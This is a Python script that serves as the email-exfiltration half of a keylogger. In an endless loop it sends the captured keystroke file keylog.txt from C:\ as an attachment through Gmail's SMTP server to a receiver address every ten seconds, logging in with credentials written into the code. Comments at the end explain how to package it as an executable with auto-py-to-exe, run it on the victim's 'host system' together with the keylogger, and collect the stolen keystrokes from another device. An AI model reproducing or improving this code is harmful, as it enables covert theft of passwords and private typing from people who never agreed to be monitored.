#library

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import time


keys_information = "keylog.txt"                  #filename where the information will be stored in notepad
email_address= "example1@gmail.com"              #sender mail that is written in script and sends information in the form of .txt to receiver main
password = "asdscsadsadsbqcz"

toaddr = "receiverexmaple@gmail.com"             #receiver/user who wants to track the keyloggs of the host via receiver main

file_path = "C:\\"                               #path of the notepad
extend = "\\"

count = 0
keys = []


#send email function


while(True):                                    #sends mail every given time period

        def send_email(filename, attachment, toaddr):

            fromaddr = email_address

            msg = MIMEMultipart()

            msg['From'] = fromaddr

            msg['To'] = toaddr

            msg['Subject'] = "Log file"

            body = "Sending keylogg to you."



            msg.attach(MIMEText(body, 'plain'))

            filename = filename
            attachment = open(attachment, 'rb')

            p = MIMEBase('application', ' octet-stream')

            p.set_payload((attachment).read())

            encoders.encode_base64(p)

            p.add_header('Content-Disposition',"attachment; filename= %s" % filename)

            msg.attach(p)

            s = smtplib.SMTP('smtp.gmail.com', 587)

            s.starttls()

            s.login(fromaddr, password)

            text = msg.as_string()

            s.sendmail(fromaddr, toaddr, text)

            s.quit()

        send_email(keys_information, file_path + extend + keys_information, toaddr)

        time.sleep(10)                      #given time period, now it's 10 seconds and cam be changed

#email_address, toaddress, password, location, name must be same in both the scripts Email.py and Keylogg.py
#use auto-py-to-exe to convert this into script and run it in host system(both the script simultaneously) and use another system or mobile login to receiver gmail and use it to fetch the data